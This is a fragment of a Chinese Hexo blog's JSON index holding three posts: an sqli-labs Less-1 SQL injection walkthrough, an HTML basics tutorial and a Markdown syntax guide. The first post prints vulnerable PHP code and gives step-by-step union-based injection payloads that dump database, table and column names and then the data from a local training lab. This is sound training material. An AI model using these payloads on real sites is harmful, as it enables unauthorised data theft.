关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。","text":"前言在学习完php的基本语言和mysql增删查改语句后，我们已经初步具备了靶场练习的能力，在群文件的《web安全方向入门学习计划表》中就提供了靶场的下载途径。让我们先从sqli-labs开始练习SQL注入。 关于SQL注入在练习靶场之前，我们首先要了解什么是SQL注入。SQL注入常常发生在通过网页获取用户输入的数据并将其插入MySQL数据库中，黑客通过把SQL命令插入到域名、web表单等手段达到欺骗服务器的目的，因此网站都会对用户输入的数据进行过滤来进行保护。 而在练习靶场中，我们就需要通过SQL注入的方式获得数据库中的数据，接下来我们来具体分析sqli-labs靶场中的第一关来深刻认识SQL注入。 less-1首先进入less-1的界面，我们可以看到一行字： Please input the ID as parameter with numeric value 那么我们就按照这句话的意思：请输入ID作为带数值的参数，在域名中输入一个ID：http://127.0.0.1/Less-1/?id=1接着按下回车后我们可以看到页面中出现了一对账号密码： 而根据提示（GET-Error based-Single quotes-String)可以知道，这道关卡是要利用源码中基于单引号的错误来进行解决，那么我们就尝试在域名结尾加上一个&#39;http://127.0.0.1/Less-1/?id=1&#39;回车后我们就可以发现网站报错了，如果没有报错的话，可以参考下面的链接关闭php的引号保护：关于Sqli-labs单引号不报错的问题而如果报错的话，我们会看到以下这段文字： You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1 那么为什么会出现这一段文字呢，我们借助文件的源码进行分析: 123456789101112131415161718192021222324252627282930if(isset($_GET[&#x27;id&#x27;]))&#123;$id=$_GET[&#x27;id&#x27;];//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);if($row) &#123; echo &quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;; echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;]; echo &quot;&lt;br&gt;&quot;; echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;]; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125; 通过分析以上部分源码，我们可以发现，当你输入一个id时，这个文件得到了一个id，if函数执行true下的代码段，将本次查询记录到result的txt文件中，并从数据库中查询，显示信息。因此当我们输入?id=1时网页能够返回账号密码。而当我们输入?id=1’时，我们可以发现，第11行代码得到id为1’后，即把$id替换为1’后，代码中出现了三个单引号，这就将导致单引号无法正确对应，引起报错。 既然多输入了一个单引号，我们就要想办法把多余出来的那个单引号排除掉，在SQL注入中，最常用的方法便是注释，我们在域名最后添加上注释符：http://127.0.0.1/Less-1/?id=1%27--+或者我们可以将–+替换为#（%23） 这样我们发现，回车后的页面重新显示正常，这时我们可以进行测试判断此处是否有注入点。我们可以使用and 1=1和and 1=2进行判断，其中1=1表示恒为真，1=2表示恒为假。通过下两图我们可以发现两者显示页面不同，说明在此处存在注入点： 既然存在注入点，我们就要想办法在此处获取我们需要的数据。由于第11行这句代码本身就是select语句，因此我们在进行查询时需要运用到union语句来合并两个select语句的结果。不过要注意，使用union语句的先决条件是语句内部的SELECT语句必须拥有相同数量的列，因此我们需要先获取表格中的字段数。使用order by语句进行字段数查询，当我们测试到order by 4时，发现文档页面出现了以下的提示： Unknown column ‘4’ in ‘order clause’ 无法识别第4列，这就说明表格中只有3列，我们就可以运用union语句来进行注入。首先我们将id改为-1，接着注入以下代码来获取显示页面对应的字段：union select 1,2,3 可以发现账户与密码两列对应的字段数为2和3，那么在下述的操作中，我们就可以将union语句中的2或3替换成新的select语句来获取我们想要的信息，例如我们可以将上述域名中的2替换为下列代码来查询全部数据库的名称：(select group_concat(schema_name) from information_schema.schemata) 或者使用将2替换为database()查询当前数据库的名称 这样我们就得到了我们要查找的数据库的名称，我们知道，数据存在于数据表里，而数据表又存在于数据库里，所以接下来我们需要获得数据库内所有表的名称。我们可以将原来2的位置继续替换成下列代码进行查询：select group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39; 取得了表名之后我们就可以想办法获得其中的数据了，数据储存在数据表的列当中，我们需要继续获得列名，这里我们获取users表中的列名，同样替换原来2的位置：select group_concat(column_name) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39; 做到这里，我们就可以愉快的获取到我们想要的信息了select group_concat(列名) from 数据库名.数据表名 总结SQL注入第一关的解题流程大致就是这样，实际上，在解题时的关键点就在于找到SQL注入点，只有找到注入点我们才能进行SQL注入，从而获得我们想要的数据。后续的每一关都会有一个提示，我们要根据提示找到那个注入点，找到注入点之后我们就可以一步一步地将数据从数据库中取出。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"}]},{"title":"HTML基础学习","slug":"HTML基础学习","date":"2021-09-22T09:24:52.000Z","updated":"2021-09-22T12:49:43.231Z","comments":true,"path":"2021/09/22/HTML基础学习/","link":"","permalink":"http://example.com/2021/09/22/HTML%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/","excerpt":"前言由于php语言常常被嵌套在HTML中用于实现动态页面，所以在进行网页源代码阅读时我们往往能看到HTML语言。在学习php之前，先学习HTML基础，可以更好的帮助我们了解网页的布局，也能使我们阅读代码时更好的理解代码含义。 一、HTML语言语法1.HTML中的语法基本","text":"前言由于php语言常常被嵌套在HTML中用于实现动态页面，所以在进行网页源代码阅读时我们往往能看到HTML语言。在学习php之前，先学习HTML基础，可以更好的帮助我们了解网页的布局，也能使我们阅读代码时更好的理解代码含义。 一、HTML语言语法1.HTML中的语法基本 HTML文件中是以标签对或标签来标记网页结构和显示资料内容的。标签对开始表现为&lt;xxx&gt;,标签结束表现为&lt;/xxx&gt;，其中还有一些标签不需要结束标签，例如&lt;br&gt;和&lt;p&gt;等，这些标签被称为空标签。 而HTML标签也是具有属性的，属性是为HTML元素所提供的说明信息。HTML的属性无先后次序之分，并且属性设置是可选的，如果不进行属性设置的话属性将会以默认值的形式被调用。下例是img图像标签格式：&lt;img src=&quot;http://www.baidu.com/img/baidu.gif&quot; height=&quot;200&quot; width=&quot;100&quot; /&gt;在上述语句中，src为路径，height为高度，width为宽度 在HTML的语法中，HTML标签名和属性都不区分大小写字母，因此，&lt;br&gt;和&lt;BR&gt;还有&lt;Br&gt;三者无任何区别。 HTML源代码中的回车与空格都不会在HTML页面中体现，因此我们需要应用格式标签进行文字排版。 2.HTML注释和所有的编程语言一样，注释不影响代码的运行，善于使用注释也是作为一个程序员应该养成的良好习惯。在HTML语言中，注释的方式比起我们常见的c语言较为特别，注释以&lt;!--开始，以--&gt;结束,举例如下： 12345678&lt;html&gt; &lt;head&gt; &lt;!--注释信息1--&gt; &lt;/head&gt; &lt;body&gt; &lt;!--注释信息2--&gt; &lt;/body&gt;&lt;/html&gt; 3.HTML字符实体有些字符串在HTML语言中具有特殊含义，比如标签中用到的”&lt;””&gt;”等等，这些字符串在HTML中就不可直接输出。而为了输出这些字符串，我们就需要应用字符实体来表示这些字符串.字符实体由”&amp;”、实体名称和”;”构成，以下列出一些常见的实体名称，在使用时要记得在其左右两边加上”&amp;”和”;”： 实体名称 输出字符串 nbsp 空格 amp &amp; lt &lt; gt &gt; quot “ 二、HTML文件结构正如编写C语言时一定需要一个主函数一样，编写HTML时也需要几个全局架构标签，这些标签将HTML代码分为了三个部分进行编写，格式如下： 123456&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt;&lt;/html&gt; 三个标签对分别为最外层标签，头部标记和文档主体标记，不同的部分起到了不同的作用，接下来我们分别介绍这三个部分。 1.最外层标签&lt;html&gt;和&lt;/html&gt;就是最外层标签，主要作用是告诉浏览器这个HTML文件的开始点与结束点。而由于HTML的不严谨性，只需要存在开始标记HTML文件就可以被浏览器解析。 2.头部标记&lt;head&gt;和&lt;/head&gt;标签为头部标记，在它们之间的文本是头信息。头信息中主要包括页面的一些描述语句，以及引入CSS和JavaScript脚本。在头信息中的标签使用量小于文档主体标记中的标签使用量，主要用来说明文件标题和整体文件的公共属性。 3.文档主体标记&lt;body&gt;和&lt;/body&gt;标签为主体标记，在他们之间的文本用来放置页面中的显示内容。网页呈现出的文字、图片、超链接等等都要在这个标记中进行声明。我们学习的php语言也会嵌套在这个部分。而&lt;body&gt;标签也有自己的属性值，可以设置其标签属性控制整个页面的风格，例如：&lt;body bgcolor=&quot;#FFFFFF&quot; text=&quot;red&quot;&gt;以上代码设置了本页面的背景颜色为黑色，字体颜色为红色 在HTML语言中，颜色即可以用英文单词表示，也可以使用RGB来表示 三、页面编辑网页有多种多样的呈现方式，网页中也含有大量元素，本版块将对最基本的文字、图片以及链接的代码进行分析。同时，由于在HTML代码的编写中，经常运用到CSS样式，想要了解CSS样式可以参考以下链接中的CSS基础教程进行学习：CSS教程 1.文字 格式标签在上文中我们提到了格式标签，格式标签一般用于定义网页的布局，下图列举了常用的格式标签： 文本标签文本标签用于强调或特殊说明一些文字，下图列举了常用的文本标签： 2.图像我们常用到的图片格式一般为jpg、png和gif，这些格式的图片通过&lt;img&gt;标签插入到HTML文档中，格式如下：&lt;img src=&quot;&quot; alt=&quot;&quot; width=&quot;&quot; height=&quot;&quot; bordre=&quot;&quot; src：需要指定一个包括URL路径名在内的图片文件 alt：定义一个字符串，当鼠标悬停图片上时输出该字符串 width：设置图像宽度，单位像素 height：设置图像高度，单位像素 border：设置相框的宽度，单位像素 3.链接网页中往往有链接之间的跳转，链接文档中的指定位置被称为锚点。在HTML语言中，&lt;a&gt;标签被用于定义锚点与超链接，语法格式如下：&lt;a href=&quot;&quot; name=&quot;&quot; target=&quot;&quot;&gt;链接文字&lt;/a&gt; href：指定所链接位置的URL路径，绝对路径与相对路径均可 name：指定页面的锚点名称 target：指定打开链接所用的浏览器窗口名称，默认为在当前窗口打开 4.其他在页面呈现中还有其他的形式，例如表格、表单等。本篇博客没有对其进行具体介绍，但我们也要对其具有阅读能力，尤其是在靶场中也经常使用的表格，我们可以参考下列链接进行HTML表格学习：HTML表格教程 总结HTML主要被用来在web上发布信息以及完成简单布局，同时为了页面美观也会运用CSS。在学习php之前对web页面布局有过了解后，可以帮助我们更好地理解代码作用，使自己阅读代码没有障碍。本文总结了常见的HTML语言语法，希望能够在之后的靶场练习中起到参考作用。 资料引用：《PHP学习手册》 ——电子工业出版社","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web前端 -html","slug":"web前端-html","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-html/"}]},{"title":"关于新手写博客时的常用md语法","slug":"关于新手写博客时的常用md语法","date":"2021-09-20T14:23:26.000Z","updated":"2021-09-22T13:29:37.868Z","comments":true,"path":"2021/09/20/关于新手写博客时的常用md语法/","link":"","permalink":"http://example.com/2021/09/20/%E5%85%B3%E4%BA%8E%E6%96%B0%E6%89%8B%E5%86%99%E5%8D%9A%E5%AE%A2%E6%97%B6%E7%9A%84%E5%B8%B8%E7%94%A8md%E8%AF%AD%E6%B3%95/","excerpt":"前言：当我们搭建完github+hexo的博客进入实验室后，我们所要面对的第一个问题便是如何用markdown语法写下自己的第一篇博客。我在阅读学习markdown语法与一些网上教程说明后，总结了一些常用markdown语法供参考。 一、关于标题","text":"前言：当我们搭建完github+hexo的博客进入实验室后，我们所要面对的第一个问题便是如何用markdown语法写下自己的第一篇博客。我在阅读学习markdown语法与一些网上教程说明后，总结了一些常用markdown语法供参考。 一、关于标题 当我们需要在markdown编辑器中加入如上（一、关于标题）的大标题时，只需要在标题文字前加上“#”字键并空格。文字前最多可以加上6个“#”键，每加入一个“#”键，标题字号就会小一号，代码如下：# Title 6种标题效果展示： TitleTitleTitleTitleTitleTitle二、关于引用当我们需要对资料进行引用时，我们可以在引用资料前加入“&lt;“键表示对文字进行引用，当然引用中同样可以继续引用，事实上，引用中的文字同样支持md语法。下方代码举例：&gt;word&gt;&gt;word 三、关于文字在markdown语法中同样有字体加粗，倾斜等效果，下方直接展示几种常用的字体效果：###1.斜体*word*word ###2.加粗**word**word ###3.斜体加粗***word***word 注意： 由于会和链接的默认样式产生混淆，markdown语法中无法直接为文字添加下划线，必须使用行内html解决该问题。 需要换行时需要在文字之间空一行。 如果需要分割线则在一个空行中输入三个或以上的“—”或“***”，效果如下： 四、插入代码如果你想在你的博客中编辑一段如上文的代码行，利用好“`”字符，举例如下：如果仅输入一行代码，在代码左右两边写上一个反引号： 如果想要输入代码块的话，在代码块的上一行与下一行写上三个反引号： 五、插入列表如果想在自己的文字前加入一个加粗黑点，即无序列表（如下） 例则只需要在你的文字之前加入“*”键，“+”键或“-”键并空格，例如：* 123+ 123- 123如果需要一个有序列表，则在文字前依次输入“1. ”“2. ”等，例如：1. a2. b3. c a b c 六、插入图片在写博客时，利用图片进行说明的环节是必不可少的。在markdown语法中，插入图片的格式为：![alt](图片地址 &quot;title&quot;)其中alt是在图片下方加入的文字注释，图片地址指的是图片在网络上的地址，因此推荐使用图床上传照片。而title是图片的标题，这部分可省略。例如上文“插入代码”中的图片语法如下：![例1](http://a1.qpic.cn/psc?/V11wVkh94am2Ju/05RlWl8gsTOH*Z17MtCBzHtFtpA*CeMm5FipmaRi.dnX*JxpHe14OqWyfguXnCP3JwMhlxlKCVqeswVw7*6gPA!!/c&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=XQAiAF0AIgARADc!&amp;tl=1&amp;tm=1632150000&amp;sce=0-12-12&amp;rf=0-18.jpg) 七、插入外链外链即超链接，语法形式与插入图片较为相似：[name](链接地址 &quot;title&quot;)其中的name指超链接的显示名称，链接地址即为网址域名，而同样title指的超链接标题，可写可不写，例如：[百度](www.baidu.com)百度 八、插入表格最后要介绍的是表格，表格在一些情况下也是不可或缺的。在markdown语法中，使用“|”来分隔不同的单元格，使用“-”来分隔表头和其他行，格式如下： 123|表头|表头|表头||---|---|---||文字|文字|文字| 表头 表头 表头 文字 文字 文字 小结以上便是我整理的关于使用md语法编写时的常用语法内容，同时这也是我第一次使用md语法进行文本编辑，希望今后我们能熟练掌握更深层次的md语法，让自己的写博客能力更上一层楼。","categories":[{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-markdown -hexo","slug":"markdown-hexo","permalink":"http://example.com/tags/markdown-hexo/"}]}],"categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"},{"name":"misc","slug":"misc","permalink":"http://example.com/categories/misc/"},{"name":"others","slug":"others","permalink":"http://example.com/categories/others/"},{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-ctf -web","slug":"ctf-web","permalink":"http://example.com/tags/ctf-web/"},{"name":"-ctf -misc","slug":"ctf-misc","permalink":"http://example.com/tags/ctf-misc/"},{"name":"-web前端 -mysql","slug":"web前端-mysql","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-mysql/"},{"name":"-web前端 -php","slug":"web前端-php","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-php/"},{"name":"-编码","slug":"编码","permalink":"http://example.com/tags/%E7%BC%96%E7%A0%81/"},{"name":"-web前端 -write up -ctf","slug":"web前端-write-up-ctf","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-write-up-ctf/"},{"name":"-web前端 -html","slug":"web前端-html","permalink":"http://example.com/tags/web%E5%89%8D%E7%AB%AF-html/"},{"name":"-markdown -hexo","slug":"markdown-hexo","permalink":"http://example.com/tags/markdown-hexo/"}]}